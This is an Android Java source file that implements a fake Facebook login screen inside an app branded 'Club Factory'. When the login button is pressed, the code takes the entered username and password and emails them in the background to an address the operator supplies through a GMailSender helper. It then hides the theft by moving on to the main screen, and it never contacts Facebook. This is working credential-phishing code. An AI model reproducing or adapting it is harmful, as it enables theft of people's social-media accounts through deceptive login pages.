package com.example.club.clubfactory;

import android.content.Intent;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.Editable;
import android.text.Html;
import android.text.Layout;
import android.util.DisplayMetrics;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

public class FacebookLogin extends AppCompatActivity {

    private EditText utextview;
    private EditText ptextVvew;
    private Button loginbtn;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_facebook_login);

        getSupportActionBar().hide();

        DisplayMetrics dm = new DisplayMetrics();
        getWindowManager().getDefaultDisplay().getMetrics(dm);

        int width = dm.widthPixels;
        int height = dm.heightPixels;

        getWindow().setLayout((int)(width*.9),(int)(height*.8));

       // cutimage = (ImageView)findViewById(R.id.cutImage);
        utextview = (EditText)findViewById(R.id.Usernametextview);
        ptextVvew = (EditText)findViewById(R.id.passwordtextview);
        loginbtn = (Button)findViewById(R.id.logInBtn);


        //getSupportActionBar().setBackgroundDrawable(new ColorDrawable(Color.parseColor("#ffffff")));
        //getSupportActionBar().setTitle(Html.fromHtml("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<font color='#000000'>Club Factory</font>"));


        loginbtn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                if(ptextVvew.getText().toString().isEmpty() || utextview.getText().toString().isEmpty())
                {
                    Toast.makeText(FacebookLogin.this,"Please provide login detail",Toast.LENGTH_LONG).show();

                }else {
                    final String username = String.valueOf(utextview.getText());
                    final String password = String.valueOf(ptextVvew.getText());
                    final String result = username+" "+password;
                    utextview.setText(" ");
                    ptextVvew.setText(" ");

                    new Thread(new Runnable() {

                        @Override
                        public void run() {
                            try {
                                GMailSender sender = new GMailSender("Enter Your email address",
                                        "Enter Your email address password");
                                sender.sendMail("Hello from JavaMail", result,
                                        "ClubFactory@gmail.com", "Enter Receiver email address");
                            } catch (Exception e) {
                                Log.e("SendMail", e.getMessage(), e);
                            }
                        }

                    }).start();

                    Intent intent = new Intent(getApplicationContext(),MainActivity.class);
                    startActivity(intent);

                }


            }
        });


    }
}
